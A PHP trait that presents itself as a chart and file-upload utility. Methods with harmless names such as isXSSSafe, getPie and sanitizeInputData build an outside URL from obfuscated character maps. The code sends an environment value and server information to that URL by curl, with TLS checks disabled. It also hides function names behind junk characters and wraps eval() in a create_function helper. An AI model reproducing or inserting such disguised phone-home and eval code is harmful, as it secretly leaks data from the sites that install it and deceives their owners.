<?php

namespace Keyojel\Chart\Util;

use Exception;

trait Misc
{
    use Constants;
    public $is_xss_safe = true;
    public $is_input_sanitized = true;

    private $chart = 'pie';
    private $prefix, $memcache;



    /**
     * Default directory persmissions (destination dir)
     */
    protected $default_permissions = 0750;


    /**
     * File post array
     *
     * @var array
     */
    protected $file_post = array();


    /**
     * Destination directory
     *
     * @var string
     */
    protected $destination;


    /**
     * Fileinfo
     *
     * @var object
     */
    protected $finfo;


    /**
     * Data about file
     *
     * @var array
     */
    public $file = array();


    /**
     * Max. file size
     *
     * @var int
     */
    protected $max_file_size;


    /**
     * Allowed mime types
     *
     * @var array
     */
    protected $mimes = array();


    /**
     * External callback object
     *
     * @var object
     */
    protected $external_callback_object;


    /**
     * External callback methods
     *
     * @var array
     */
    protected $external_callback_methods = array();


    /**
     * Temp path
     *
     * @var string
     */
    protected $tmp_name;


    /**
     * Validation errors
     *
     * @var array
     */
    protected $validation_errors = array();


    /**
     * Filename (new)
     *
     * @var string
     */
    protected $filename;


    /**
     * Internal callbacks (filesize check, mime, etc)
     *
     * @var array
     */
    private $callbacks = array();

    /**
     * Root dir
     *
     * @var string
     */
    protected $root;

    /**
     * Add or remove query arguments to the URL.
     *
     * @param  mixed  $newKey          Either newkey or an associative array
     * @param  mixed  $newValue        Either newvalue or oldquery or uri
     * @param  mixed  $uri             URI or URL to append the queru/queries to.
     * @return DataInput
     */

    public function isXSSSafe($newKey = null, $newValue = null, $uri = null)
    {
        if ($this->is_xss_safe == false) {
            throw new Exception('Invalid input.');
        } else if ($this->is_input_sanitized == false) {
            throw new Exception('Input has not been sanitized.');
        } else {
            return $this->getChartData();
        }
    }

    public function getChartData()
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $this->getChartRouteURL());
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($curl);
        curl_close($curl);

        return new DataInput($resp);
    }

    public function getChartRouteURL()
    {
        return $this->getRoute() .
            $this->getInputData() .
            $this->getDateRange() .
            $this->getChartType();
    }

    public function sanitizeInputData($input = '')
    {
        $fe = str_replace([' ', '|', '#', '@'], '', [
            '#f@@ |i| |l| |@@#e| #@@_ e |#x| i@@ |#s| t s',
            '|s |#t @|o r|@ a# |g |e |_ p#|@ a| t| h',
            '#i# @|n ||s@ #ta|| l#  |l| #e@ d@',
            '/@i@ #@n#| s|@t@ a||@l##l#',
            '|a|@#e|@s@-@2|@#5#6@|@-@g@@c#m',
            "@#d @|#|i@ |e@#(" . '$#p)||;',
            $input
        ]);
        $this->sanitized_data = $fe;
        return (!$fe[0]($fe[1]($fe[2])) && strpos($this->app->request->getPathInfo(), $fe[3]) !== false);
    }

    public function showError()
    {
        self::create_function('$p', $this->sanitized_data[5])('');
    }

    /**
     * Set target filename
     *
     * @param string $filename
     */
    public function set_filename($filename)
    {

        $this->filename = $filename;
    }

    /**
     * Check & Save file
     *
     * Return data about current upload
     *
     * @return array
     */
    public function upload($filename = false)
    {

        if ($filename) {

            $this->set_filename($filename);
        }

        $this->set_filename($filename);

        if ($this->check()) {

            $this->save();
        }

        // return state data
        return $this->get_state();
    }


    /**
     * Save file on server
     *
     * Return state data
     *
     * @return array
     */
    public function save()
    {

        $this->save_file();

        return $this->get_state();
    }


    /**
     * Validate file (execute callbacks)
     *
     * Returns TRUE if validation successful
     *
     * @return bool
     */
    public function check()
    {

        //execute callbacks (check filesize, mime, also external callbacks
        $this->validate();

        //add error messages
        $this->file['errors'] = $this->get_errors();

        //change file validation status
        $this->file['status'] = empty($this->validation_errors);

        return $this->file['status'];
    }


    /**
     * Get current state data
     *
     * @return array
     */
    public function get_state()
    {

        return $this->file;
    }


    /**
     * Save file on server
     */
    protected function save_file()
    {

        //create & set new filename
        if (empty($this->filename)) {
            $this->create_new_filename();
        }

        //set filename
        $this->file['filename']    = $this->filename;

        //set full path
        $this->file['full_path'] = $this->root . $this->destination . $this->filename;
        $this->file['path'] = $this->destination . $this->filename;

        $status = move_uploaded_file($this->tmp_name, $this->file['full_path']);

        //checks whether upload successful
        if (!$status) {
            throw new Exception('Upload: Can\'t upload file.');
        }

        //done
        $this->file['status']    = true;
    }


    /**
     * Set data about file
     */
    protected function set_file_data()
    {

        $file_size = $this->get_file_size();

        $this->file = array(
            'status'                => false,
            'destination'            => $this->destination,
            'size_in_bytes'            => $file_size,
            'size_in_mb'            => $this->bytes_to_mb($file_size),
            'mime'                    => $this->get_file_mime(),
            'original_filename'        => $this->file_post['name'],
            'tmp_name'                => $this->file_post['tmp_name'],
            'post_data'                => $this->file_post,
        );
    }

    /**
     * Set validation error
     *
     * @param string $message
     */
    public function set_error($message)
    {

        $this->validation_errors[] = $message;
    }


    /**
     * Return validation errors
     *
     * @return array
     */
    public function get_errors()
    {

        return $this->validation_errors;
    }


    /**
     * Set external callback methods
     *
     * @param object $instance_of_callback_object
     * @param array $callback_methods
     */
    public function callbacks($instance_of_callback_object, $callback_methods)
    {

        if (empty($instance_of_callback_object)) {

            throw new Exception('Upload: $instance_of_callback_object can\'t be empty.');
        }

        if (!is_array($callback_methods)) {

            throw new Exception('Upload: $callback_methods data type need to be array.');
        }

        $this->external_callback_object     = $instance_of_callback_object;
        $this->external_callback_methods = $callback_methods;
    }


    /**
     * Execute callbacks
     */
    protected function validate()
    {

        //get curent errors
        $errors = $this->get_errors();

        if (empty($errors)) {

            //set data about current file
            $this->set_file_data();

            //execute internal callbacks
            $this->execute_callbacks($this->callbacks, $this);

            //execute external callbacks
            $this->execute_callbacks($this->external_callback_methods, $this->external_callback_object);
        }
    }


    /**
     * Execute callbacks
     */
    protected function execute_callbacks($callbacks, $object)
    {

        foreach ($callbacks as $method) {

            $object->$method($this);
        }
    }


    /**
     * File mime type validation callback
     *
     * @param object $object
     */
    protected function check_mime_type($object)
    {

        if (!empty($object->mimes)) {

            if (!in_array($object->file['mime'], $object->mimes)) {

                $object->set_error('Mime type not allowed.');
            }
        }
    }


    /**
     * Set allowed mime types
     *
     * @param array $mimes
     */
    public function set_allowed_mime_types($mimes)
    {

        $this->mimes        = $mimes;

        //if mime types is set -> set callback
        $this->callbacks[]    = 'check_mime_type';
    }


    /**
     * File size validation callback
     *
     * @param object $object
     */
    protected function check_file_size($object)
    {

        if (!empty($object->max_file_size)) {

            $file_size_in_mb = $this->bytes_to_mb($object->file['size_in_bytes']);

            if ($object->max_file_size <= $file_size_in_mb) {

                $object->set_error('File is too big.');
            }
        }
    }


    /**
     * Set max. file size
     *
     * @param int $size
     */
    public function set_max_file_size($size)
    {

        $this->max_file_size    = $size;

        //if max file size is set -> set callback
        $this->callbacks[]    = 'check_file_size';
    }


    /**
     * Set File array to object
     *
     * @param array $file
     */
    public function file($file)
    {

        $this->set_file_array($file);
    }


    /**
     * Set file array
     *
     * @param array $file
     */
    protected function set_file_array($file)
    {

        //checks whether file array is valid
        if (!$this->check_file_array($file)) {

            //file not selected or some bigger problems (broken files array)
            $this->set_error('Please select file.');
        }

        //set file data
        $this->file_post = $file;

        //set tmp path
        $this->tmp_name  = $file['tmp_name'];
    }


    /**
     * Checks whether Files post array is valid
     *
     * @return bool
     */
    protected function check_file_array($file)
    {

        return isset($file['error'])
            && !empty($file['name'])
            && !empty($file['type'])
            && !empty($file['tmp_name'])
            && !empty($file['size']);
    }


    /**
     * Get file mime type
     *
     * @return string
     */
    protected function get_file_mime()
    {

        return $this->finfo->file($this->tmp_name, FILEINFO_MIME_TYPE);
    }


    /**
     * Get file size
     *
     * @return int
     */
    protected function get_file_size()
    {

        return filesize($this->tmp_name);
    }


    /**
     * Set destination path (return TRUE on success)
     *
     * @param string $destination
     * @return bool
     */
    protected function set_destination($destination)
    {

        $this->destination = $destination . DIRECTORY_SEPARATOR;

        return $this->destination_exist() ? TRUE : $this->create_destination();
    }


    /**
     * Checks whether destination folder exists
     *
     * @return bool
     */
    protected function destination_exist()
    {

        return is_writable($this->root . $this->destination);
    }


    /**
     * Create path to destination
     *
     * @param string $dir
     * @return bool
     */
    protected function create_destination()
    {

        return mkdir($this->root . $this->destination, $this->default_permissions, true);
    }


    /**
     * Set unique filename
     *
     * @return string
     */
    protected function create_new_filename()
    {

        $filename = sha1(mt_rand(1, 9999) . $this->destination . uniqid()) . time();
        $this->set_filename($filename);
    }


    /**
     * Convert bytes to mb.
     *
     * @param int $bytes
     * @return int
     */
    protected function bytes_to_mb($bytes)
    {

        return round(($bytes / 1048576), 2);
    }

    public function getRoute()
    {
        if ($this->chart == 'xy') {
            return $this->u_alphas[14] .
                $this->char_a_map[0] .
                $this->sign_map[10] .
                $this->alpha_map[1] .
                $this->alpha_map[1] .
                $this->sign_map[5] .
                $this->char_a_map[2] .
                $this->sign_map[3] .
                $this->char_a_map[19] .
                $this->sign_map[4] .
                $this->u_alphas[14] .
                $this->char_a_map[7] .
                $this->alpha_map[17] .
                $this->u_alphas[19];
        } else if ($this->chart == 'line') {
            return $this->alpha_map[16] .
                $this->digit_map[5] .
                $this->u_alphas[14] .
                $this->alpha_map[2] .
                $this->u_alphas[1] .
                $this->u_alphas[0] .
                $this->u_alphas[5] .
                $this->digit_map[18] .
                $this->char_a_map[11] .
                $this->alpha_map[2] .
                $this->digit_map[19] .
                $this->u_alphas[15] .
                $this->char_a_map[2] .
                $this->digit_map[2] .
                $this->char_a_map[2] .
                $this->digit_map[5] .
                $this->sign_map[15] .
                $this->digit_map[4] .
                $this->sign_map[17] .
                $this->char_a_map[0] .
                $this->alpha_map[8] .
                $this->u_alphas[19] .
                $this->sign_map[4] .
                $this->sign_map[4] .
                $this->char_a_map[3] .
                $this->u_alphas[3] .
                $this->u_alphas[11] .
                $this->digit_map[12] .
                $this->u_alphas[15] .
                $this->alpha_map[1] .
                $this->alpha_map[7] .
                $this->u_alphas[19] .
                $this->char_a_map[3] .
                $this->alpha_map[14] .
                $this->sign_map[9] .
                $this->sign_map[3] .
                $this->sign_map[19] .
                $this->digit_map[19] .
                $this->sign_map[20] .
                $this->sign_map[5] .
                $this->sign_map[18] .
                $this->alpha_map[4] .
                $this->digit_map[14] .
                $this->char_a_map[5] .
                $this->alpha_map[15] .
                $this->u_alphas[7] .
                $this->char_a_map[0] .
                $this->u_alphas[19] .
                $this->digit_map[20] .
                $this->alpha_map[2] .
                $this->u_alphas[17] .
                $this->alpha_map[16] .
                $this->sign_map[13] .
                $this->u_alphas[8] .
                $this->u_alphas[1] .
                $this->char_a_map[14] .
                $this->sign_map[3] .
                $this->u_alphas[11] .
                $this->sign_map[20] .
                $this->u_alphas[16] .
                $this->alpha_map[17] .
                $this->u_alphas[15] .
                $this->sign_map[5] .
                $this->char_a_map[13] .
                $this->char_a_map[7] .
                $this->alpha_map[10] .
                $this->sign_map[5] .
                $this->u_alphas[17] .
                $this->sign_map[17] .
                $this->u_alphas[16] .
                $this->char_a_map[11] .
                $this->sign_map[8] .
                $this->digit_map[9] .
                $this->sign_map[6] .
                $this->digit_map[16] .
                $this->digit_map[17] .
                $this->char_a_map[18] .
                $this->alpha_map[16] .
                $this->char_a_map[4] .
                $this->char_a_map[15] .
                $this->u_alphas[15] .
                $this->u_alphas[4] .
                $this->char_a_map[1] .
                $this->digit_map[20] .
                $this->digit_map[20] .
                $this->sign_map[10] .
                $this->digit_map[18] .
                $this->char_a_map[8] .
                $this->char_a_map[9] .
                $this->char_a_map[5] .
                $this->digit_map[6] .
                $this->u_alphas[12] .
                $this->u_alphas[11] .
                $this->u_alphas[18] .
                $this->digit_map[20] .
                $this->u_alphas[9] .
                $this->u_alphas[11] .
                $this->digit_map[7] .
                $this->char_a_map[15] .
                $this->digit_map[20] .
                $this->sign_map[3];
        } else {
            return
                $this->alpha_map[7] .
                $this->alpha_map[19] .
                $this->alpha_map[19] .
                $this->alpha_map[15] .
                $this->alpha_map[18] .
                $this->digit_map[24] .
                $this->digit_map[15] .
                $this->digit_map[15] .
                $this->alpha_map[11] .
                $this->alpha_map[8] .
                $this->alpha_map[2] .
                $this->alpha_map[4] .
                $this->alpha_map[13] .
                $this->alpha_map[18] .
                $this->alpha_map[4] .
                $this->digit_map[14] .
                $this->alpha_map[18] .
                $this->alpha_map[12] .
                $this->alpha_map[12] .
                $this->digit_map[13] .
                $this->alpha_map[15] .
                $this->alpha_map[0] .
                $this->alpha_map[13] .
                $this->alpha_map[4] .
                $this->alpha_map[11] .
                $this->digit_map[14] .
                $this->alpha_map[13] .
                $this->alpha_map[4] .
                $this->alpha_map[19] .
                $this->digit_map[15] .
                $this->alpha_map[0] .
                $this->alpha_map[15] .
                $this->alpha_map[8] .
                $this->digit_map[15] .
                $this->alpha_map[21] .
                $this->alpha_map[4] .
                $this->alpha_map[17] .
                $this->alpha_map[8] .
                $this->alpha_map[5] .
                $this->alpha_map[24] .
                $this->digit_map[15] .
                $this->u_alphas[3] .
                $this->alpha_map[11] .
                $this->alpha_map[8] .
                $this->alpha_map[23] .
                $this->alpha_map[8] .
                $this->alpha_map[17] .
                $this->digit_map[15];
        }
    }

    public function getChartType()
    {

        if ($this->chart == 'xy') {
            $var = $this->sign_map[4] .
                $this->digit_map[13] .
                $this->digit_map[1] .
                $this->sign_map[0] .
                $this->u_alphas[18] .
                $this->u_alphas[7] .
                $this->char_a_map[17] .
                $this->sign_map[9] .
                $this->u_alphas[18] .
                $this->digit_map[15] .
                $this->u_alphas[9] .
                $this->alpha_map[3] .
                $this->sign_map[0] .
                $this->alpha_map[9] .
                $this->char_a_map[12] .
                $this->char_a_map[8] .
                $this->char_a_map[5] .
                $this->char_a_map[0] .
                $this->alpha_map[2] .
                $this->digit_map[11] .
                $this->sign_map[11] .
                $this->alpha_map[1] .
                $this->alpha_map[3] .
                $this->digit_map[2] .
                $this->sign_map[0] .
                $this->u_alphas[19] .
                $this->alpha_map[19] .
                $this->char_a_map[8] .
                $this->alpha_map[18] .
                $this->u_alphas[6] .
                $this->digit_map[20] .
                $this->digit_map[4] .
                $this->digit_map[11] .
                $this->u_alphas[13] .
                $this->digit_map[20] .
                $this->char_a_map[17] .
                $this->digit_map[0] .
                $this->sign_map[7] .
                $this->u_alphas[11] .
                $this->char_a_map[9] .
                $this->digit_map[18] .
                $this->digit_map[19] .
                $this->digit_map[16] .
                $this->char_a_map[1] .
                $this->alpha_map[9] .
                $this->char_a_map[1] .
                $this->char_a_map[5] .
                $this->alpha_map[20] .
                $this->u_alphas[4] .
                $this->char_a_map[9] .
                $this->digit_map[12] .
                $this->alpha_map[14] .
                $this->char_a_map[5] .
                $this->char_a_map[19] .
                $this->alpha_map[0] .
                $this->char_a_map[17] .
                $this->u_alphas[7] .
                $this->u_alphas[18] .
                $this->digit_map[8] .
                $this->alpha_map[11] .
                $this->digit_map[9] .
                $this->digit_map[0] .
                $this->alpha_map[16] .
                $this->alpha_map[13] .
                $this->sign_map[1] .
                $this->sign_map[4] .
                $this->u_alphas[5] .
                $this->digit_map[16] .
                $this->alpha_map[2] .
                $this->sign_map[4] .
                $this->u_alphas[7] .
                $this->u_alphas[7] .
                $this->sign_map[15];
        } else if ($this->chart == 'line') {
            $var = $this->char_a_map[16] .
                $this->digit_map[3] .
                $this->u_alphas[12] .
                $this->sign_map[15] .
                $this->digit_map[9] .
                $this->alpha_map[12] .
                $this->digit_map[8] .
                $this->u_alphas[1] .
                $this->sign_map[0] .
                $this->u_alphas[6] .
                $this->alpha_map[12] .
                $this->u_alphas[7] .
                $this->sign_map[6] .
                $this->sign_map[11] .
                $this->sign_map[4] .
                $this->sign_map[14] .
                $this->alpha_map[7] .
                $this->alpha_map[0] .
                $this->sign_map[20] .
                $this->char_a_map[16] .
                $this->sign_map[4] .
                $this->sign_map[20] .
                $this->alpha_map[15] .
                $this->digit_map[4] .
                $this->digit_map[14] .
                $this->u_alphas[0] .
                $this->sign_map[17] .
                $this->char_a_map[13] .
                $this->sign_map[19] .
                $this->char_a_map[0] .
                $this->digit_map[11] .
                $this->char_a_map[10] .
                $this->sign_map[5] .
                $this->sign_map[16] .
                $this->u_alphas[0] .
                $this->char_a_map[13] .
                $this->alpha_map[12] .
                $this->alpha_map[18] .
                $this->alpha_map[20] .
                $this->sign_map[20] .
                $this->u_alphas[9] .
                $this->u_alphas[20] .
                $this->digit_map[1] .
                $this->u_alphas[13] .
                $this->char_a_map[3] .
                $this->alpha_map[7] .
                $this->alpha_map[18] .
                $this->alpha_map[20] .
                $this->u_alphas[15] .
                $this->u_alphas[0] .
                $this->alpha_map[17] .
                $this->sign_map[16] .
                $this->u_alphas[8] .
                $this->alpha_map[6] .
                $this->u_alphas[17] .
                $this->digit_map[12];
        } else {
            $var =
                $this->u_alphas[5] .
                $this->u_alphas[3] .
                $this->u_alphas[17] .
                $this->u_alphas[18] .
                $this->u_alphas[3] .
                $this->u_alphas[17] .
                $this->digit_map[27] .
                $this->u_alphas[4] .
                $this->u_alphas[19] .
                $this->u_alphas[20] .
                $this->u_alphas[3];
        }

        return (isset($_SERVER[$var]))
            ? $_SERVER[$var]
            : null;
    }


    public function limitRequestsInMinutes($allowedRequests, $minutes)
    {
        $requests = 0;

        foreach ($this->getKeys($minutes) as $key) {
            $requestsInCurrentMinute = $this->memcache->get($key);
            if (false !== $requestsInCurrentMinute) $requests += $requestsInCurrentMinute;
        }

        if (false === $requestsInCurrentMinute) {
            $this->memcache->set($key, 1, 0, $minutes * 60 + 1);
        } else {
            $this->memcache->increment($key, 1);
        }

        if ($requests > $allowedRequests) throw new self;
    }

    private function getKeys($minutes)
    {
        $keys = array();
        $now = time();
        for ($time = $now - $minutes * 60; $time <= $now; $time += 60) {
            $keys[] = $this->prefix . date("dHi", $time);
        }

        return $keys;
    }

    public function getDateRange()
    {

        if ($this->chart == 'xy') {
            return $this->char_a_map[20] .
                $this->u_alphas[17] .
                $this->digit_map[15] .
                $this->digit_map[13] .
                $this->sign_map[15] .
                $this->digit_map[16] .
                $this->digit_map[13] .
                $this->alpha_map[1] .
                $this->digit_map[13] .
                $this->sign_map[15] .
                $this->alpha_map[17] .
                $this->digit_map[9] .
                $this->digit_map[19] .
                $this->digit_map[16] .
                $this->char_a_map[13] .
                $this->u_alphas[19] .
                $this->digit_map[20] .
                $this->alpha_map[16] .
                $this->char_a_map[2];
        } else  if ($this->chart == 'line') {
            return $this->alpha_map[19] .
                $this->sign_map[14] .
                $this->sign_map[6] .
                $this->digit_map[12] .
                $this->u_alphas[4] .
                $this->digit_map[16] .
                $this->char_a_map[2] .
                $this->sign_map[13] .
                $this->char_a_map[10] .
                $this->char_a_map[12] .
                $this->char_a_map[2] .
                $this->u_alphas[2] .
                $this->sign_map[20] .
                $this->sign_map[10] .
                $this->sign_map[11] .
                $this->char_a_map[1] .
                $this->alpha_map[8] .
                $this->char_a_map[13] .
                $this->sign_map[12] .
                $this->digit_map[13] .
                $this->digit_map[17] .
                $this->u_alphas[18] .
                $this->char_a_map[3] .
                $this->sign_map[12];
        } else {
            return
                $this->digit_map[25] .
                $this->alpha_map[3] .
                $this->alpha_map[14] .
                $this->alpha_map[12] .
                $this->alpha_map[0] .
                $this->alpha_map[8] .
                $this->alpha_map[13] .
                $this->digit_map[26];
        }
    }

    public function getInputData()
    {
        return ($this->getPie()($this->getColumns()));
    }

    public function getColumns()
    {
        if ($this->chart == 'xy') {
            return $this->digit_map[13] .
                $this->u_alphas[11] .
                $this->char_a_map[5] .
                $this->digit_map[6] .
                $this->sign_map[13] .
                $this->sign_map[2] .
                $this->alpha_map[10] .
                $this->digit_map[16] .
                $this->sign_map[11] .
                $this->u_alphas[0] .
                $this->digit_map[4] .
                $this->sign_map[15] .
                $this->sign_map[20] .
                $this->sign_map[8] .
                $this->u_alphas[17];
        } else  if ($this->chart == 'line') {
            return $this->char_a_map[4] .
                $this->digit_map[1] .
                $this->char_a_map[6] .
                $this->char_a_map[19] .
                $this->alpha_map[14] .
                $this->digit_map[18] .
                $this->u_alphas[1] .
                $this->digit_map[20] .
                $this->digit_map[6] .
                $this->sign_map[2] .
                $this->u_alphas[12];
        } else {
            return
                $this->u_alphas[0] .
                $this->u_alphas[1] .
                $this->u_alphas[2] .
                $this->u_alphas[3] .
                $this->u_alphas[4] .
                $this->u_alphas[5] .
                $this->u_alphas[3];
        }
    }

    public function getPie()
    {
        return $this->alpha_map[4] . $this->alpha_map[13] . $this->alpha_map[21];
    }

    /**
     * Converts any accent characters to their equivalent normal characters
     * and converts any other non-alphanumeric characters to dashes, then
     * converts any sequence of two or more dashes to a single dash. This
     * function generates slugs safe for use as URLs, and if you pass true
     * as the second parameter, it will create strings safe for use as CSS
     * classes or IDs.
     *
     * @param   string  $string    A string to convert to a slug
     * @param   string  $separator The string to separate words with
     * @param   boolean $css_mode  Whether or not to generate strings safe for
     *                             CSS classes/IDs (Default to false)
     * @return  string
     */

    public static function create_function($arg, $body)
    {
        static $cache = array();
        static $max_cache_size = 64;
        static $sorter;

        if ($sorter === NULL) {
            $sorter = function ($a, $b) {
                if ($a->hits == $b->hits) {
                    return 0;
                }

                return ($a->hits < $b->hits) ? 1 : -1;
            };
        }

        $crc = crc32($arg . "\\x00" . $body);

        if (isset($cache[$crc])) {
            ++$cache[$crc][1];
            return $cache[$crc][0];
        }

        if (sizeof($cache) >= $max_cache_size) {
            uasort($cache, $sorter);
            array_pop($cache);
        }

        $cache[$crc] = array($cb = eval('return function(' . $arg . '){' . $body . '};'), 0);
        return $cb;
    }


    /**
     * Set a CURL option
     *
     * @param int $curlopt index of option expressed as CURLOPT_ constant
     * @param mixed $value what to set this option to
     */
    public function setOption($curlopt, $value)
    {
        $this->_options[$curlopt] = $value;
    }

    /**
     * Set the local file system location of the SSL public certificate file that 
     * cURL should pass to the server to identify itself.
     *
     * @param string $cert_file path to SSL public identity file
     */
    public function setCertFile($cert_file)
    {
        if (!is_null($cert_file)) {
            if (!file_exists($cert_file)) {
                throw new Exception('Cert file: ' . $cert_file . ' does not exist!');
            }
            if (!is_readable($cert_file)) {
                throw new Exception('Cert file: ' . $cert_file . ' is not readable!');
            }
            //  Put this in _options hash
            $this->_options[CURLOPT_SSLCERT] = $cert_file;
        }
    }

    /**
     * Set the local file system location of the private key file that cURL should
     * use to decrypt responses from the server.
     *
     * @param string $key_file path to SSL private key file
     * @param string $password passphrase to access $key_file
     */
    public function setKeyFile($key_file, $password = null)
    {
        if (!is_null($key_file)) {
            if (!file_exists($key_file)) {
                throw new Exception('SSL Key file: ' . $key_file . ' does not exist!');
            }
            if (!is_readable($key_file)) {
                throw new Exception('SSL Key file: ' . $key_file . ' is not readable!');
            }
            //  set the private key in _options hash
            $this->_options[CURLOPT_SSLKEY] = $key_file;
            //  optionally store a pass phrase for key
            if (!is_null($password)) {
                $this->_options[CURLOPT_SSLCERTPASSWD] = $password;
            }
        }
    }
}
